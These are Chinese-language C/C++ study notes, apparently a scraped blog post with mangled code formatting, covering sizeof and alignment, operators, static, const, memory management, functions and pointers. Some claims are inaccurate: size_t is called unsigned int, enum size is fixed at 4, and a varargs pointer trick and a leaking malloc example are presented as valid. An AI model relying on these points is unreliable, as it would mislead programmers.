sizeof运算符使用方法sizeof属于运算符，而不是函数。以字节形式给出其操作数的存储大小。操作数可以是一个表达式或括在括号内的类型名。操作数是类型名时必须加括号，比如sizeof(int)。 sizeof的计算发生在编译时刻，可以直接作为常量表达式使用，所以其操作数中的运算会被忽略，比如sizeof(a++)，其中的++并不执行。 实际上，sizeof 计算对象的大小也是转换成对对象类型的计算，也就是说，同种类型的不同对象其sizeof值都是一致的。这里，对象可以进一步延伸至表达式，即sizeof可以对一个表达式求值，编译器根据表达式的最终结果类型来确定大小，一般不会对表达式进行计算。比如sizeof(2)等价于sizeof(int)，sizeof(2+3.14)等价于sizeof(double)。 函数、位域成员不能被计算sizeof值。 使用结果sizeof操作符的结果类型是size_ t，它被定义为unsigned int 类型。该类型保证能容纳实现所建立的最大对象的字节大小。 数据类型 占据字节长度(16bit编译器) 占据字节长度(32bit编译器) 占据字节长度(64bit编译器) shortint 2 2 2 int 2 4 4 long 4 4 4 long long 8 8 8 float 4 4 4 double 8 8 8 char 1 1 1 bool 1 1 1 指针 - 4 8 引用 取决于被引用对象 取决于被引用对象 取决于被引用对象 若有:char ch3[]=&quot;Danie1&quot;;则sizeof(ch3) = sizeof(&quot;Daniel&quot;)=7，而strlen(&quot;Daniel&quot;)=6。 可见sizeof计算数据（包括数组、变量、类型、结构体等）所占内存空间，用字节数表示，故将内容为’\\0’的数组元素也会计算在内。而strlen()计算字符数组的字符数，以’\\0’为结束标志，且不将’\\0’计算在字符数内。 注意：sizeof(&quot;\\0&quot;) = 2。 指针可视为变量类型的一种。在32位机器系统下，所有指针变量的sizeof操作结果均为4，若在64位机器系统下，所有指针变量的sizeof 操作结果为8。 数组可以使用sizeof计算其大小，等于元素个数*元素类型的sizeof。 struct的空间计算struct的空间计算总体遵循两个原则： **&#x3D;&#x3D;整体空间是占用空间最大的成员(的类型)所占字节数的整数倍&#x3D;&#x3D;**，但在32位Linux+gcc环境下，若最大成员类型所占字节数超过4，如double是8，则整体空间是4的倍数即可。 数据对齐原则：内存按结构体成员的先后顺序排列，&#x3D;&#x3D;当排到该成员变量时，其前面已摆放的空间大小必须是该成员类型大小的整数倍（当排到子结构体时，其前面已摆放的空间大小必须是该子结构体成员中最大类型大小的整数倍）&#x3D;&#x3D;，如果不够则补齐，依次向后类推，但在Linux+gcc环境下，若某成员类型所占字节数超过4,如double是8，则前面已摆放的空间大小是4的整数倍即可，不够则补齐。对齐问题使结构体的sizeof变得比较复杂。 &#x3D;&#x3D;注意&#x3D;&#x3D;：结构体中，数组时按照单个单个变量一个一个进行摆放，而不是视为整体。空结构体的占用空间大小为1。 含位域的结构体的空间计算使用位域的主要目的是压缩存储，其大致规则为: 如果相邻位域字段的类型相同，且其位宽之和小于类型的sizeof大小，则后面的字段将紧邻前一个字段存储，直到不能容纳为止。所占字节数以其实际占用字节数为准，也就是进行压缩。 如果相邻位域字段的类型相同，但其位宽之和大于类型的sizeof大小，则后面的字段将从新的存储单元开始，其偏移量为其类型大小的整数倍，不进行压缩。 如果相邻的位域字段的类型不同，则各编译器的具体实现有差异，VC6 采取不压缩方式，Dev-C++与linux+gcc采取压缩方式 如果位域字段之间穿插着非位域字段，则不进行压缩 整个结构体的总大小为最宽基本类型成员大小的整数倍。 123456// 环境为linux+gccstruct a&#123; int f1:3; char b; char c;&#125;; 比如，上述结构体中f1占3个bits，b非位域类型，所以f1占用1个字节，abc总共占用3个字节。最后由于整个结构体的总大小为最宽基本类型成员int大小的整数倍，所以总共要占用4个字节。 union的空间计算结构体在内存组织上是顺序式的，而联合体union是重叠式的，各成员共享一段内存，所以整个联合体的sizeof也就是每个成员sizeof的最大值，且整体空间是占用空间最大的成员(的类型)所占字节数的整数倍。即取占用内存最多的成员的空间作为自己的空间，且需要考虑对齐。 1234union&#123; char b[9]; int bh[2];&#125;c; 上述代码的union中，数组b占用9个字节，bh占用8个，考虑占用内存最大的成员，所以应该是占用9个字节；又需要考虑对齐，占用空间应该是4（int占用空间）的整数倍，所以补齐为12。 枚举的空间计算enum仅定义一个常量集合，里面没有元素，而枚举类型均作为int类型存储，因此枚举类型的sizeof均为4。 4. 运算符及其优先级赋值语句略 自增与自减运算符以++操作为例，对于变量a, ++a表示取a的地址，增加它的内容，然后把值放在寄存器中; a++表示取a的地址，把它的值装入寄存器，然后增加内存中a的值。前缀运算是“先变后用”，而后缀运算是“先用后变”。 &#x3D;&#x3D;注意&#x3D;&#x3D;：a++只能位于等号的右边，而++a可以位于等号的左边。 负号运算符与自增（减）运算符的优先级相同，结合方向是从右向左。比如k=-i++等价于k=-(i++)。 特别的，对于指针变量： *p++ 实现了先输出p所指地址处的数据值，然后指针后移到下一指针处； *++p 实现了先将指针指向后移，再输出此时指针所指处的数据的值； (*p)++ 实现的是将指针p所指向地址处的数据值（比如300）输出后再自增1（得到301）； 关系与逻辑运算符关系操作符：&lt;、&lt;&#x3D;、&gt;、&gt;&#x3D;。具有左结合性质，先执行左边的部分。但是不建议将多个关系操作符串接使用。 在if(i&lt;j&lt;k)这种写法中，只要k大于1,上述表达式的值就为true。 这是因为第二个小于操作符的左操作数是第一个小于操作符的结果: true 或false。 也就是，该条件将k与整数0或1做比较。为了实现我们想要的条件检验，应重写上述表达式如下：if(i&lt;j &amp;&amp; j&lt;k)。 逻辑与和逻辑或操作符总是先计算其左操作数，然后再计算其右操作数。只有在仅靠左操作数的值无法确定该逻辑表达式的结果时，才会求解其右操作数。我们常常称这种求值策略为“短路求值”。 位运算符位运算符使用整型操作数，将其视为二进制位的集合。 (n&amp;(n-1))==0用于判断n的二进制表示是否仅有一位为1。 异或运算满足交换律。两相同的数异或结果为0，可用于寻找数成对出现时缺失的某一个数。 例1： 给你一个由n-1个整数组成的未排序的序列，其元素都是1到n中的不同的整数。请写出一个寻找序列中缺失整数的线性时间算法。 解答: 1)求这n-1个数的和sum,然后计算n(n+1)2-sum可得。此种解法当n很大时，加法运算有可能溢出。 2)用异或运算可以解决。首先求得从1到n共n个数的异或结果A，即A&#x3D;1^2^3..^n，然后用题目中的序列依次与A求异或，最后得到的数，就是丢失的整数。 例2： 不使用第三方变量，交换两个变量的值： a&#x3D;a^b;b&#x3D;a^b;a&#x3D;a^b; &#x3D;&#x3D;~运算符的优先级 &gt; 移位运算符的优先级 &gt; 与、或、异或运算符的优先级。&#x3D;&#x3D; 赋值转换赋值转换指的是将一种类型的值赋给另一种类型的变量，这时，值将会转换为接收变量的类型。 比如int val = 3.14;得到的val为3，int *p; p = 0;中int型的0转换为int *类型的空指针。 当把一个超出其取值范围的值赋给一个指定类型的对象时，比如将一个 int 类型的数赋值为short类型的数，当前大多数的系统都是将int低字节赋值给short,而将高位舍去（相当于取余）。当把一个取值范围小的值赋给一个取值范围大的值，则进行符号位扩展。 表达式转换 整型提升在表达式计算中，C++将bool、char、unsigned char、signed char、short 和signed short型值都会自动转换成int型，对bool类型而言，true 转换为1, false 则转换为0。 &#x3D;&#x3D;同一类型的无符号类型与有符号类型所占内存空间相同，只不过无符号类型将符号位作为数值位而已。所以在C++中， 有符号数与无符号数转换时，内存中的内容并没改变，只是对内存中相同的数据解释不同而已。&#x3D;&#x3D; int和unsigned int混合运算时，int会被转换为unsigned int，内存的内容不变，但是符号位被当作数值，所表示的数值发生改变，且恒大于等于0。 比如int类型的-1的字节是100……001，共32位，第一位为符号位。由于在计算机中用补码表示数值（负数的补码为其符号位之外的位数求反然后加1），所以-1在内存中为其补码111……111。当其转为unsigned int时，所有位均表示数值，那么此数就是2^32-1。 所以unsigned int类型的变量一直减1，结果也不会小于0。 运算时的转换 当运算涉及两种类型时，较小的类型将会被转换成较大的类型，换言之，表达力低的类型将会被转换成表达力高的类型。各类型表达能力从低到高排列为： int (等价于signed int)、unsigned int、long (等价与signed long) 、unsigned long、float、double、long double &#x3D;&#x3D;其余例题见P74例5&#x3D;&#x3D; 显示转换（强制类型转换）略 运算符优先级表 运算符优先级有几个简单的规则: 括号，下标，&gt;和.(成员)最高； 单目的比双目的高；算术双目的比其他双目的高； 移位运算高于关系运算；**关系运算高于按位运算(与，或，异或)**；按位运算高于逻辑运算； 三目的只有一个条件运算，低于逻辑运算； 赋值运算仅比”,“高，且所有的赋值运算符优先级相同，结合访问位从右向左。 5. C预处理器、作用域、static、const以及内存管理5.1 C预处理器宏定义与宏替换宏定义不分配内存，变量定义才会分配内存。宏定义末尾不加分号。 #define指示接受一个名字并定义该名字为预处理器变量。 1234// 符号常量的宏定义及宏替换# define 标识符 字符串// 带有参数的宏定义及宏替换，如#define FUN(x) ((x)*(x)) 为避免宏替换时发生错误，参数最好加上括号# define 标识符(参数列表) 字符串 宏替换的本质很简单——文本替换。关于宏定义与宏替换请注意以下几点： 宏名一般用大写（避免名字冲突），宏名和参数的括号间不能有空格，宏定义末尾不加分号； 宏替换只作替换，不做语法检查，不做计算，不做表达式求解； 宏替换在编译前进行，不分配内存，函数调用在编译后程序运行时进行，并且分配内存； 函数只有一个返回值，利用宏则可以设法得到多个值； 宏替换使源程序变长，函数调用不会； 宏替换不占运行时间，只占编译时间，函数调用占运行时间（分配内存、保留现场、值传递、返回值）。 &#x3D;&#x3D;注意&#x3D;&#x3D;：应尽量少用宏替换。在C++中，宏替换实现的符号常量功能由const、enum代替，带参数的宏替换可由模版内联函数代替。 文件包含1234// 标准头文件#include &lt;standard_header&gt;// 非系统头文件#include &quot;myfile.h&quot; 条件编译提供条件编译措施使同一源程序可以根据不同编译条件(参数)产生不同的目标代码，其作用在于便于调试和移植。条件编译控制语句有不同形式： 1234#if/ifdef/ifndef#elif#else#endif #ifndef检测指定的预处理器变量是否未定义。如果预处理器变量未定义，那么跟在其后的所有语句都被处理，直到出现#endif。如果预处理器变量已定义，那么跟在其后直到出现#endif的所有语句都被忽略。 5.2 全局变量与局部变量 全局变量 在函数外部定义的变量，属于源程序文件，作用域为整个源程序。 在函数中使用全局变量时，需要说明使用的是全局变量。 在不同文件中引用一个已经定义过的全局变量：可以用引用头文件的方式，也可以用extern关键字。下面的代码给出了使用extern引用已经定义过的全局变量的例子。 12345// file_ 1.cppint counter; //定义counter// file_ 2.cppextern int counter; //使用file 1中的counter++counter; // 使file_ 1中的counter自增1 局部变量 在程序中，只在特定过程或函数中可以访问的变量。局部变量可以与全局变量同名且屏蔽全局变量。 在语句的控制结构中定义的变量尽在定义它们的块语句结束前有效。这种变量的作用域限制在语句体内。比如比如while(int i &#x3D;get_num())中的i。 在同一个文件中，当局部变量屏蔽了全局变量，而又想要使用全局变量时，有两种方法。一种是使用做用域操作符”::”，一种是使用”extern”。 1234::counter++;// 或者extern int count; counter++; 5.3 staticstatic的作用 **隐藏：使变量不能被其他文件访问**（对于函数和全局变量） 当编译多个文件时，所有未加static前缀的全局变量和函数都具有全局可见性，其他的源文件也能访问。如果加了static前缀就会对其他源文件隐藏。利用这一特性可以在不同的文件中定义同名函数和同名变量，不必担心命名冲突。 默认初始化为0（未初始化的全局静态变量和局部静态变量） 初始化的全局变量和静态变量存放在DATA段，未初始化的全局变量和静态变量存放在BSS段（未初始化数据段）。在BSS段中，内存中所有的字节默认值都是0x00，某些时候这一特点可以减少程序员的工作量。比如初始化一个稀疏矩阵，我们可以一个个地把所有元素都置0，然后把不是0的几个元素赋值。如果定义成静态的，就省去了一开始置0的操作。再比如要把一一个字符 数组当字符串来用，但又觉得每次在字符数组末尾加’\\0’太麻烦。如果把字符串定义成静态的，就省去了这个麻烦，因为那里本来就是’\\0’。 函数体外的内置数组，不管有没有static前缀，均会将各元素初始化为0；在函数体内定义的内置函数，若没有static前缀，各元素未初始化，其值不确定。 保持局部变量内容的持久 函数内的自动(局部)变量，当调用时就存在，退出函数时就消失，但静态局部变量虽然在函数内定义，但静态局部变量始终存在着，也就是说它的生存期为整个源程序，其特点是只进行一次初始化且具有“记忆性”。静态局部变量的生存期虽然为整个源程序，但是其作用域仍与局部变量相同，即只能在定义该变量的函数内使用该变量。退出该函数后，尽管该变量还继续存在，但不能使用它。 12345678910111213141516int count=3; // 外部变量int main (void) &#123; int i, sum, count=2; for(i=0, sum=0; i&lt;count; i+=2, count++) &#123; static int count=4; //局部静态变量，只初始化一次 count++; if(i%2 == 0)&#123; extern int count; // 此处为外部变量，即第一行的count count++ ; sum += count; //语句1，sum第一次循环+4，第二次循环+5 &#125; sum +=count; //语句2，此处count为局部静态变量，sum第一次循环+5，第二次循环+6 &#125; printf (&quot;%d %d\\n&quot;, count, sum); // 此处为第三行的count，输出结果为4 20 return 0;&#125; 类中static的作用用于表示属于一个类而不属于此类的任何特定对象的变量和函数（与java中此关键字的含义相同）。 静态数据成员 在类内数据成员的声明前加上关键字static，静态数据成员独立于该类的任意对象而存在，即当某个类的实例修改了该静态成员变量，其修改值为该类的其他所有实例所见。静态数据成员和普通数据成员一样遵从public, protected, private访问规则。 由于静态数据成员定义时需要分配空间，所以不能在类声明中定义。**&#x3D;&#x3D;static数据成员必须在类定义体的外部定义&#x3D;&#x3D;**。一般而言，类的static 成员，像普通数据成员一 样，不能在类的定义体中初始化，static数据成员通常在类定义体的外部定义时才初始化。即在类定义体中对静态变量赋初值是错误的。 123456789101112131415class Account ( public: void applyint() &#123; amount += amount*interestRate; &#125; static double rate() &#123; return interestRate; &#125; static void rate (double); // sets a new rate private: std: :string Owner; double amount ; static double interestRate; // 仅声明，需要在类外定义 static double interestRate=0.3; // 错误，不可以在类定义体中对静态变量赋初值 static double initRate() ;&#125;;double Account::interestRate = initRate(); // 在类外定义 &#x3D;&#x3D;例外：const static数据成员可以在类的定义体中进行初始化&#x3D;&#x3D;。基本整型const static数据成员在类的定义体中初始化时，该数据成员仍必须在类的定义体之外进行定义，只不过定义时，不再需要初始化。（相当于在类外定义，在类定义体中进行const static声明和初始化） 例：C++中关于对象成员内存分布的描述正确的是（）。 A. 不管该类被产生多少个对象，静态成员变量永远只有一个实例，且在没有对象实例的情况下已经存在。B, 费静态成员数据在类中的排列顺序将和其被声明的顺序相同，任何中间介入的静态成员都不会被放进对象的内存布局中。C. 在同一访问段（也就是private，public，protected等区间段内），数据成员的排列符合“较晚出现的成员在对象中有较高的内存地址”。D. 带有虚函数的类对象占用的内存大小跟虚函数的个数成正比。 解析：ABC。 类中数据成员的布局情况: 非静态成员在类对象中的排列顺序和声明顺序一致， 任何在其中间声明的静态成员都不会被放进对象布局中。 静态数据成员存放在程序的全局(静态)存储中，和个别类对象无关。C++标准规定，在同一个访问块即private、public、 protected 等区段中，成员的排列只需符合较晚出现的成员在类对象中有较高的地址即可。 静态成员函数 ​ 静态成员函数同样属于类定义的一部分，为类服务，而不是某个具体对象。普通成员函数总是具体的属于某个类的具体对象，所以普通的成员函数一般都隐含了一个this指针，this指针指向类的对象本身。但是静态成员由于不与任何的对象相关联，因此不具有this指针。因而它无法访问类对象的非静态数据成员，也无法访问非静成员函数，它只能调用其余的静态成员函数与访问静态数据成员。 static成员函数不是任何对象的组成部分，因此static成员函数不能声明const。毕竟，将成员函数声明为const后就承诺不会修改函数所属的对象，而static成员函数不属于任何对象。 static成员函数也不能被声明为虚函数、volatile。 关于静态成员函数，可以总结为以下几点: 静态成员之间可以相互访问，包括静态成员函数访问静态数据成员和访问静态成员函数。**静态成员函数不能访问非静态成员函数和非静态数据成员，非静态成员函数可以任意地访问静态成员函数和静态数据成员**（静态成员变量可被该类的所有方法访问）; 由于没有this指针的额外开销，因此静态成员函数与类的非静态成员函数相比速度上会有少许的增长。 5.4 const常量const限定符将一个对象转换为一个常量。常量在定义后就不能被修改，所以在定义时必须进行初始化。 在全局作用域里定义非const 变量时，它在整个程序中都可以访问。 但是除非特别说明，在全局作用域声明的const 变量是定义该对象的文件的局部变量。此变量只存在于那个文件中，不能被其他文件访问。通过指定const 变更为extern，就可以在整个程序中访问const 对象： 123456// file 1.cppextern const int counter=10; // 定义counter，extern使const常量可以被其他文件访问// file 2.cppextern const int counter; //使用file 1中的counterfor (int index=0; index != counter; ++index).. 在C语言中多使用#define进行常量声明。 如果在C中使用const，下面的语句在C语言中编译错误，因为在C中const意思是“一个不能被改变的普通变量”，即它被放在内存中，C编译器不知道它在编译时的值。但在C++中，下面的语句是可行的。 12const bufSize = 100;int buf[bufSize ]; const相比#define的优势： const常量有数据类型，而宏常量没有数据类型。编译器可以对前者进行类型安全检查。而对后者只进行字符替换，没有类型安全检查； 使用常量可能比使用#define导致产生更小的目标代码，这是因为预处理器”盲目地将宏名称BUFSIZE替换为其代替的值100”可能导致目标代码出现多份100的备份，但常量就不会出现这种情况。 const还可以执行常量折叠（常量折叠是在编译时间简单化常量表达的一个过程，简单来说就是将常量表达式计算求值，并用求得的值来替换表达式，放入常量表），也就是说，编译器在编译时可以通过必要的计算把一一个复杂的常量表达式缩减成简单的。 综上，在C++中，我们应该用const取代#define。 指针和const在指针的声明中，需要区分指向const对象的指针和const指针。 指向const对象的指针 如果指针指向const对象，则不允许用指针来改变其所指的const值。为了保证这个特性，C++强制要求指向const对象的指针也必须具有const特性。 123const double *cptr = &amp;value;// 等价于double const *cptr = &amp;value; cptr是一个指向const double类型的指针，cptr 的值可以改变，但是不能通过ptr改变value的值； const指针 使指针本身成为一个const指针，所指向的值可以改变，但是地址不变。声明时必须把const标明的部分放在*的右边，如： 12double value=0.1;double* const cptr = &amp;value; // 由于指针是const，所以编译时必须有初始化 cptr 的值不可以改变，但是可以通过ptr改变value的值。 const修饰函数参数与返回值 const修饰返回值 const 修饰返回值常用在处理用户定义的类型时。当处理用户定义的类型时，返回值不为常量有时会对用户造成困扰。 函数除了返回值类型外，还可以返回指针。函数不能返回指向局部栈变量的指针，这是因为在函数返回后它们是无效的，而且栈也被清理了（栈会自动分配和释放）。可返回的指针是指向堆中分配的存储空间的指针或指向静态存储区的指针，在函数返回后它仍然有效。 比如： 123456789101112char *GetMemory (void) &#123; char p[]=&quot;he1lo world&quot;; // 数组，内存分配在栈上 return P: // 返回指向栈内存的指针，但是由于是局部变量，返回时原来的内容已被清除，p指向的新内容不可知&#125; void Test (void) &#123; char *str-NULL; str=GetMemory(); printf(str); // 输出可能是乱码&#125;Test(); 可以改为如下内容： 1234567891011121314151617181920211) char *GetMemory (void) &#123; static char p[]=&quot;hello world&quot; ; // 数组位于静态存储区,生存周期为整个源程序，可通过函数返回 return p;&#125;2) char *GetMemory (void) &#123; char *p=&quot;hel1o world&quot;; /* &quot;hel1o world&quot;位于文字常量区，所以p是指向全局(静态)存储区的指针，可通过函数返回*/ return p;&#125;3) char *GetMemory (void) &#123; char *p = (char*)malloc(12); /* p是指向堆中分配存储空间的指针，可通过函数返回，但需要以后调用delete []释放内存，否则会造成内存泄露*/ if(p == NULL) return NULL; else P=&quot; hello world&quot;; return P;&#125; const修饰函数参数 使参数值在函数体内不会发生改变。主要是用来修饰地址，使地址不发生改变。 若使用值或者函数返回值作为函数参数，那么传递给函数的均为临时变量，会被函数作为常量，编译器会为其分派临时存储单元，并产生一个地址和其引用捆绑在一起，存储的内容是常量，所以实参必须是const。 cosnt在类中的应用const只能作用于成员函数，不能作用于全局函数。 const成员函数 确保该成员函数可作用于const对象。 1234class base&#123; void func1(); void func2() const;&#125; func1默认会有对象的this指针作为形参。func2声明时末尾的const使得this所指向的对象也为const，这使得该函数可作用于const对象。因为const对象只能调用其const成员函数，无法调用其非const成员函数。 非const对象可以调用所有成员函数。 const数据成员 常量数据成员（常量成员变量）&#x3D;&#x3D;必须在构造函数的成员初始化列表中进行初始化&#x3D;&#x3D;，并且必须有构造函数。因为const 数据成员只在某个对象生存期内是常量，而对于整个类而言却是可变的。而类可以创建多个对象，不同的对象其const数据成员的值可以不同。所以不能在类的声明中初始化const数据成员，因为类的对象没被创建时，编译器不知道const数据成员的值是什么。 12345struct Thing&#123; Thing():valueB(1)&#123;*&#125;) // 使用构造函数初始化列表对const数据成员valueB进行初始化 int valueA; const int valueB;&#125;; &#x3D;&#x3D;例外：当const整型数据成员同时被声明为static时，可以使用外部初始化。&#x3D;&#x3D;因为static使得该数据成员为类所有，而不是对象，只能在类外进行定义。 如果想要建立在整个类中都恒定的常量，除了使用上面的const static外，还可以使用枚举常量实现，如： 1234567891011class Test&#123;public: Test():a(0) &#123;&#125; // 在构造函数初始化列表中对const数据成员a进行初始化 enum &#123;size1-100, size2=200&#125;;private : const int a; //只能在构造函数初始化列表中初始化 static int b; //在类的实现文件中（即类定义体的外部）定义并初始化 const static int c; /*与static const int c; 相同，c为整型，故也可在此处初始化，但仍需在类定义体外进行定义，注意c为非整型时，不能在此处初始化，整型包括char、short、int、long*/&#125;;int Test::b=0; /* static成员变量不能在构造函数初始化列表中初始化，因为它不属于某个对象*/const int Test::c=0; /*注意:给const static成员变量赋值时，不需要加static修饰符，但要加const*/ 5.5 内存管理与释放一个C&#x2F;C+ +的程序，用户使用的内存主要分为以下几个部分： 堆 手动分配和释放，与数据结构中的堆不是同一个概念，分配方式类似链表。一般速度较慢，容易产生内存碎片，不过用起来方便。C中由malloc、free操作，C++中由new、delete操作。若不手动释放，则在程序结束后由系统释放。malloc与free是C&#x2F;C++语言的标准库函数，new&#x2F;delete 是C++的运算符。 12char* p1 = (char *)malloc(10); // 申请10个字节空间，由free释放char* p2 = new char[10]; // 由delete[]释放 但是注意指针p1、p2 本身是在栈中的，它们指向在堆上分配的内存。**回收用new[]分配的一组对象的内存空间时用delete[]**。 栈区(stack) 由编译器自动分配和释放，存放函数的参数值、局部变量的值等。操作方式类似数据结构中的栈，速度较快。 全局（静态）存储区 存放全局变量和静态变量。初始化的全局变量和静态变量存放在DATA段，未初始化的存放在BSS段。程序结束后由系统释放， BSS段的特点是在程序执行之前BSS段会自动清0。所以未初始化的全局变量和静态变量在程序执行前已经为0。 文字常量区：存储常量字符串。程序结束后由系统释放。 程序代码区：存放函数体的二进制代码。 C语言内存操作函数12345678910void GetMemory(char *p)&#123; p=(char*)malloc(11);&#125;int main()&#123; char *str=&quot;hello&quot;; GetMemory(str); strcpy(str, &quot;hello word&quot;); // 运行错误 printf(&quot;%s&quot;,str); return 0;&#125; 上述程序会运行错误。 开始时，str是指向文字常量区的指针，GetMemory函数并不会为str新分配空间。如上图所示，函数调用传参时，str和形参的p虽然指向相同，但它们自身的地址不同，是两个不同的变量。 如上图所示，p在执行malloc之后就指向不同的位置了，随后因为p是局部变量而被释放，malloc的空间没有free，成为无法引用的空间了。 str一直指向的是”hello”的文字常量区，而文字常量是不允许修改的，故调用strcpy时会出错。 C++内存管理动态创建对象如果不是显示初始化（如string()），那么对于类类型的对象，用该类默认构造函数初始化；而内置类型的对象则无法初始化，如： 1234string *ps=new string; //调用默认构造函数初始化string *ps=new string(); //调用默认构造函数初始化int *pi=new int; // pi指向的内容未初始化int *pi=new int(); // 显式初始化，pi指向一个初始化为0的int值 可见对于提供了默认构造函数的类类型(如string)，没有必要对其对象进行显式初始化。因为无论程序是明确地不初始化还是要求进行初始化，都会自动调用其默认构造函数初始化该对象。 而对于内置类型或没有定义默认构造函数的类型，采用不同初始化方式则有显著的差别。内置类型对象或未提供默认构造函数的类类型对象必须显式初始化。 new的执行过程是：首先，调用名为operator new的标准库函数，分配足够大的原始未类型化的内存，以保存指定类型的一个对象；接下来，运行该类型的一个构造函数，用指定初始化式构造对象；最后，返回指向新分配并构造的对象的指针。 delete的执行过程是：首先，对sp指向的对象运行适当的析构函数；然后，通过调用名为operator delete的标准库函数释放该对象所用内存。 malloc&#x2F;free与new&#x2F;delete的区别： malloc&#x2F;free是C&#x2F;C++语言的标准库函数，new&#x2F;delete是C++运算符 new自动计算需要分配的空间，而malloc需要手工计算字节数 new是类型安全的，而malloc则不是 new调用operator new分配足够的空间，并调用相关对象的构造函数，而malloc只负责分配空间，不能调用构造函数；delete将调用实例的析构函数，然后调用operator delete，以释放该实例占用的控件，而free只负责释放空间，不能调用析构函数 malloc&#x2F;free需要库文件支持，new&#x2F;delete不需要 6. 函数一般的来说，函数是可以返回局部变量的。 局部变量的作用域只在函数内部，在函数返回后，局部变量的内存已经释放了。因此，如果函数返回的是局部变量的值，不涉及地址，程序不会出错。但是如果返回的是局部变量的地址(指针)的话，程序运行后会出错。因为函数只是把指针复制后返回了，但是指针指向的内容已经被释放了，这样指针指向的内容就是不可预料的内容，调用就会出错。准确的来说，函数不能通过返回指向栈内存的指针(注意这里指的是栈，返回指向堆内存的指针是可以的。 参数传递形参和实参用作数据传送。形参出现在函数定义中，仅在函数体中可以使用。实参出现在主调函数中，进入被调函数后，实参变量也不能使用。主调函数只是把实参的值传送给被调函数的形参，只有引用才会改变实参。 C语言的函数参数传递可以分为传递值和传递地址（指针）。C++中可以分为传递值、传递指针、传递引用。 12345viod f1(int* m, long&amp; n) ; int a; long b;&#125;f1(&amp;a, b); // m为指针传递，n为引用传递 给函数传递实参遵循变量初始化的规则。非引用类型的形参以相应实参的副本(值)初始化，若是对象还会调用拷贝构造函数。对(非引用)形参的任何修改仅作用于局部副本，并不影响实参本身。为了避免传递副本的开销，可将形参指定为引用类型，这时内存中不会产生实参的副本。对引用形参的任何修改会直接影响实参本身。应将不需要修改相应实参的引用形参定义为const引用。 要使引用pr代表变量char *p， 则pr的初始化语句为char* &amp;pr=p;。 使用指针和解引用来交换变量的值： 12345678910void swap(int *p1,int *p2)&#123; // 交换指针所指向地址的内容 int t=*p1; *p1=*p2; *p2=t;&#125;int a=10;int b=20;swap(&amp;a,&amp;b); 内联函数通常编译时，调用内联函数的地方，将不进行函数调用，而是使用函数体替换调用处的函数名，形式类似宏替换，这种替换称为内联扩展。 内联扩展可以消除函数调用时的时间开销。将函数指定为inline函数，通常就是将它在程序中每个调用点上“内联地”展开。 一般来说，内联机制适用于优化小的、只有几行的而且经常被调用的函数。大多数的编译器都不支持递归函数的内联。 成员函数成为内联函数在类中定义的成员函数全部默认为内联函数，可以显式加上inline标识符，或者不加。在类中声明的成员函数，如果加了inline, 则其为内联函数；如果没加inline，而在类外定义该成员函数时加了inline，该成员函数也为内联函数。 普通函数成为内联函数在普通函数声明或定义前加inline使其成为内联函数。 注意：宏定义与内联函数的区别 首先，宏定义是在预处理阶段进行代码替换，而内联函数是在编译阶段插入代码； 其次， 宏定义没有类型检查，而内联函数有类型检查。 默认参数 默认参数只可以在函数声明中设定一次，只有在无函数声明时，才可以在函数定义中设定。 默认参数定义的顺序为自右到左。即如果一个参数设定了默认值，其右边的参数都要有默认值。 默认值可以是全局变量、全局常量，甚至一个函数，但不可以是局部变量。因为默认参数是在编译时确定的，而局部变量位置与默认值在编译时无法确定。 接受可变参数的函数实现多个数的相加： 1234567891011121314int add(int num, ...)&#123; int sum=0; int index=0; int* p=(int*)&amp;num+1; for(;index&lt;num;++index)&#123; sum += *p++; &#125; return sum;&#125;int main()&#123; int i=1, j=2, k=3; cout&lt;&lt;add(3,i,j,k); return 0;&#125; 函数重载进行函数重载时，要求同名函数在参数个数上不同，或者参数类型上不同。 操作符重载，本质上也是函数重载，它大大丰富了已有操作符的含义，方便使用，如+可用于连接字符串等。 函数模板与泛型在泛型编程中，我们所编写的类和函数能够多态地用于跨越编译时不相关的类型。一个类或一个函数可以用来操纵多种类型的对象。标准库中的容器、迭代器和算法是很好的泛型编程的例子。标准库用独立于类型的方式定义每个容器、迭代器和算法，因此几乎可以在任意类型上使用标准库的类和函数。 函数模板在C++中，模板是泛型编程的基础。模板是创建类或函数的蓝图或公式。 模板定义以关键字template开始，后接模板形参表，模板形参表是用尖括号括住的一个或多个模板形参的列表，形参之间以逗号分隔。模板形参表不能为空。同样，模板形参表示可以在类或函数的定义中使用的类型或值。 1234template &lt;typename T&gt; // 关键字使用class或者typenameT add(T x, T y)&#123; // T表示哪个实际类型由编译器根据所用的函数参数而确定 return x+y;&#125; 类模板123456789101112template &lt;class Type&gt;class Queue &#123; public: Queue(); // default constructor Type &amp;front (); // return element from head of Queue const Type &amp;front () const; void push (const Type &amp;); // add element to back of Queue void pop(); // remove element from head of Queue bool empty() const; / true if no elements in the Queue private: // ……&#125;; 使用类模板时，必须为模板形参显式指定实参Queue&lt;int&gt; qi;编译器使用实参来实例化这个类的特定类型版本，即编译器用用户提供的实际特定类型（比如int）代替Type，重新编写Queue。 函数的递归必须注意递归模型不能是循环定义的，其必须满足下面的两个条件： 递归表达式(递归体) 边界条件(递归出口) 递归的精髓在于能否将原始问题转换为属性相同但规模较小的问题。 在递归调用的过程中，系统为每一层的返回点、 局部变量、传入实参等开辟了递归工作栈来进行数据存储，递归次数过多容易造成栈溢出等。而其效率不高的原因是递归调用过程中包含很多重复的计算。 7. 指针与引用指针指针的声明一个有效的指针必然是以下三种状态之一： 保存一个特定对象的地址；指向某个对象后面的另一对象；或者是0值。若指针保存0值，表明它不指向任何对象。未初始化的指针是无效的，直到给该指针赋值后，才可使用它。 特别的，对于指针变量： *p++ 实现了先输出p所指地址处的数据值，然后指针后移到下一指针处； *++p 实现了先将指针指向后移，再输出此时指针所指处的数据的值； (*p)++ 实现的是将指针p所指向地址处的数据值（比如300）输出后再自增1（得到301）； typedefC语言允许用typedef说明一种新类型名，来代替已有类型名，形式为： 1typedef 类型名 标识符; typedef并未产生新的数据类型，它的作用仅仅是给已存在的类型名起一个“别名”，且原有类型名依然有效。 例1: typedef char* String_t;和#define string_d char \\*这两句在使用上有什么区别?(2012●腾讯) 解答：前者声明一个类型的别名，在编译时处理，有类型检查；后者是-一个简单的替换，在预编译时处理，无类型检查。从使用上来说，String_t a, b;“中a和b都是char*类型的，但String _d a, b;中只有a是char*类型的，b是char型的。 void* 指针void* 指针是一种特殊类型的指针，其可以保存任何类型对象的地址。 void*表明该指针与一地址有关，但是不清楚此地址上的对象的类型，故仅支持几种有限的操作： 与另一个指针进行比较 向函数传递void*指针或从函数返回void* 指针 给另一个void*指针赋值。 不允许使用void*指针操纵它所指向的对象。 